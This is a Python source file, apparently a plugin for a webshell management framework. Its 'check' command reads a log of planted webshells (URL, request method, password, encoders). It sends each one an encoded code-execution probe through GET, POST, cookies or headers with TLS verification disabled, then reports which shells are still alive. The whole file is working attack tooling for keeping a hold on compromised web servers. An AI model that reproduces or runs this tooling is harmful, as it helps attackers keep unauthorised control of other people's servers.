from libs.config import gget, alias, color
from os.path import exists
from os import urandom
from hashlib import md5
from random import randint
from requests import post, exceptions


@alias(True)
def run(timeout: float = 2.0):
    """
    check

    Check if each webshell is alive.

    eg: check {timeout=2.0}
    """
    if not exists("webshell.log"):
        print(color.red("No webshell.Log"))
        return 0

    with open("webshell.log", "r") as f:
        lines = f.readlines()

        for index, line in enumerate(lines, 1):
            data = line.strip().split("|")
            if len(data) < 3:
                continue
            url, method, pwd, *encode_functions = data

            # 请求方法
            if method == "GET":
                raw_key = "params"
            elif method == "POST":
                raw_key = "data"
            elif method == "COOKIE":
                raw_key = "cookies"
            elif method == "HEADER":
                raw_key = "headers"
            else:
                print(f"[{color.blue(str(index))}] {color.red('Method error')}")
                continue

            # 检查值
            check_value = randint(0,int(urandom(8).hex(), 16))
            correct_value = md5(str(check_value).encode()).hexdigest()
            check_command = f"print(md5('{check_value}'));"

            # 编码器
            encode_pf = gget("encode.pf")
            for func in encode_functions:
                if func in encode_pf:
                    check_command = encode_pf[func].run(check_command)

            # 设置请求参数
            params_dict = {raw_key: {pwd: check_command},"timeout": timeout }

            common_text, status_code_text = "", "000"
            try:
                res = post(url, verify=False, **params_dict)
                status_code_text = str(res.status_code)
                if correct_value in res.text:
                    common_text = color.green("Alive")
                else:
                    common_text = color.red("Not Alive")
            except exceptions.Timeout:
                common_text = color.yellow("Timeout")
            except exceptions.RequestException:
                common_text = color.red("Request error")
            print(f"[{color.blue(str(index))}] [{color.yellow(status_code_text)}] {common_text} {url}")
